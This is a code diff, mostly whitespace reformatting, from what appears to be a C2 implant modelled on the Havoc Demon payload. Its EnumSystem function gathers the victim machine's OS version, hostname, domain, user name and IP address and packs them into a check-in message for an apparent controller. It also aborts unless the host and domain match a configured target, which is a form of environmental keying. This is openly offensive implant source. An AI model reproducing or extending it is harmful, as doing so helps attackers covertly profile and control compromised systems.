@@ -46,110 +46,119 @@ namespace Main {
         ContextDestroy();
     }
 
-    BOOL EnumSystem() {
-	    // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
-	    HEXANE;
+  BOOL EnumSystem() {
+    // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
+    HEXANE;
 
-	    _stream *out = CreateStreamWithHeaders(TypeCheckin);
+    _stream *out = CreateStreamWithHeaders(TypeCheckin);
 
-	    IP_ADAPTER_INFO adapter		= { };
-	    OSVERSIONINFOW os_version	= { };
-	    BOOL success = false;
+    IP_ADAPTER_INFO adapter	= { };
+    OSVERSIONINFOW os_version   = { };
+    BOOL success = false;
 
-	    PROCESSENTRY32 proc_entry = { };
-	    proc_entry.dwSize = sizeof(PROCESSENTRY32);
+    PROCESSENTRY32 proc_entry   = { };
+    proc_entry.dwSize           = sizeof(PROCESSENTRY32);
 
-	    HANDLE snap = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	    if (snap == INVALID_HANDLE_VALUE) {
-		    goto defer;
-	    }
-
-	    x_ntassertb(ctx->enumapi.RtlGetVersion(&os_version));
-
-	    ctx->session.version = WIN_VERSION_UNKNOWN;
-	    os_version.dwOSVersionInfoSize = sizeof(os_version);
-
-	    if (os_version.dwMajorVersion >= 5) {
-		    if (os_version.dwMajorVersion == 5) {
-			    if (os_version.dwMinorVersion == 1) {
-				    ctx->session.version = WIN_VERSION_XP;
-			    }
-		    } else if (os_version.dwMajorVersion == 6) {
-			    if (os_version.dwMinorVersion == 0) {
-				    ctx->session.version = WIN_VERSION_2008;
-			    } else if (os_version.dwMinorVersion == 1) {
-				    ctx->session.version = WIN_VERSION_2008_R2;
-			    } else if (os_version.dwMinorVersion == 2) {
-				    ctx->session.version = WIN_VERSION_2012;
-			    } else if (os_version.dwMinorVersion == 3) {
-				    ctx->session.version = WIN_VERSION_2012_R2;
-			    }
-		    } else if (os_version.dwMajorVersion == 10) {
-			    if (os_version.dwMinorVersion == 0) {
-				    ctx->session.version = WIN_VERSION_2016_X;
-			    }
-		    }
-	    }
-
-	    DWORD name_len = MAX_PATH;
-	    CHAR buffer[MAX_PATH] = { };
-
-	    if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
-		    if (ctx->config.hostname[0]) {
-			    if (MbsBoundCompare(buffer, ctx->config.hostname, MbsName_Len(ctx->config.hostname)) != 0) {
-                  // LOG ERROR (bad host)
-				    success = true;
-                    goto defer;
-			    }
-		    }
-		    PackString(out, buffer);
-	    } else {
-		    PackUint32(out, 0);
-	    }
-
-	    MemSet(buffer, 0, MAX_PATH);
-	    name_len = MAX_PATH;
-
-	    if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
-		    if (ctx->network.domain[0]) {
-			    if (MbsBoundCompare(ctx->network.domain, buffer, MbsName_Len(ctx->network.domain)) != 0) {
-                  // LOG ERROR (bad domain)
-                  success = true;
-                  goto defer;
-			    }
-		    }
-		    PackString(out, buffer);
-	    } else {
-		    PackUint32(out, 0);
-	    }
-
-	    MemSet(buffer, 0, MAX_PATH);
-	    name_len = MAX_PATH;
-
-	    if (ctx->enumapi.GetUserNameA((LPSTR) buffer, &name_len)) {
-		    PackString(out, buffer);
-	    } else {
-		    PackUint32(out, 0);
-	    }
-
-	    MemSet(buffer, 0, MAX_PATH);
-	    name_len = sizeof(IP_ADAPTER_INFO);
-	    if (ctx->enumapi.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
-		    PackString(out, adapter.IpAddressList.IpAddress.String);
-	    } else {
-		    PackUint32(out, 0);
-	    }
-
-	    MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
-        success = true;
-
-    defer:
-        success ? MessageQueue(out) : DestroyStream(out);
-	    return success;
+    HANDLE snap = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) {
+        goto defer;
     }
 
-	BOOL ResolveApi() {
-		// TODO: create separate ResolveApi for loader and payload
+    x_ntassertb(ctx->enumapi.RtlGetVersion(&os_version));
+
+    ctx->session.version = WIN_VERSION_UNKNOWN;
+    os_version.dwOSVersionInfoSize = sizeof(os_version);
+
+    if (os_version.dwMajorVersion >= 5) {
+        if (os_version.dwMajorVersion == 5) {
+            if (os_version.dwMinorVersion == 1) {
+                        ctx->session.version = WIN_VERSION_XP;
+            }
+      }
+      else if (os_version.dwMajorVersion == 6) {
+        if (os_version.dwMinorVersion == 0) {
+            ctx->session.version = WIN_VERSION_2008;
+        }
+        else if (os_version.dwMinorVersion == 1) {
+            ctx->session.version = WIN_VERSION_2008_R2;
+        }
+        else if (os_version.dwMinorVersion == 2) {
+            ctx->session.version = WIN_VERSION_2012;
+        }
+        else if (os_version.dwMinorVersion == 3) {
+            ctx->session.version = WIN_VERSION_2012_R2;
+        }
+      } else if (os_version.dwMajorVersion == 10) {
+            if (os_version.dwMinorVersion == 0) {
+                ctx->session.version = WIN_VERSION_2016_X;
+            }
+        }
+    }
+
+    DWORD name_len = MAX_PATH;
+    CHAR buffer[MAX_PATH] = { };
+
+    if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
+        if (ctx->config.hostname[0]) {
+            if (MbsBoundCompare(buffer, ctx->config.hostname, MbsName_Len(ctx->config.hostname)) != 0) {
+                // LOG ERROR (bad host)
+                success = true;
+                goto defer;
+            }
+        }
+        PackString(out, buffer);
+    }
+    else {
+        PackUint32(out, 0);
+    }
+
+    MemSet(buffer, 0, MAX_PATH);
+    name_len = MAX_PATH;
+
+    if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
+        if (ctx->network.domain[0]) {
+            if (MbsBoundCompare(ctx->network.domain, buffer, MbsName_Len(ctx->network.domain)) != 0) {
+                // LOG ERROR (bad domain)
+                success = true;
+                goto defer;
+            }
+        }
+        PackString(out, buffer);
+    }
+    else {
+        PackUint32(out, 0);
+    }
+
+    MemSet(buffer, 0, MAX_PATH);
+    name_len = MAX_PATH;
+
+    if (ctx->enumapi.GetUserNameA((LPSTR) buffer, &name_len)) {
+        PackString(out, buffer);
+    }
+    else {
+        PackUint32(out, 0);
+    }
+
+    MemSet(buffer, 0, MAX_PATH);
+    name_len = sizeof(IP_ADAPTER_INFO);
+
+    if (ctx->enumapi.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
+        PackString(out, adapter.IpAddressList.IpAddress.String);
+    }
+    else {
+        PackUint32(out, 0);
+    }
+
+    MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
+    success = true;
+
+  defer:
+    success ? MessageQueue(out) : DestroyStream(out);
+    return success;
+  }
+
+    BOOL ResolveApi() {
+        // TODO: create separate ResolveApi for loader and payload
 		HEXANE;
 
 		bool success = true;
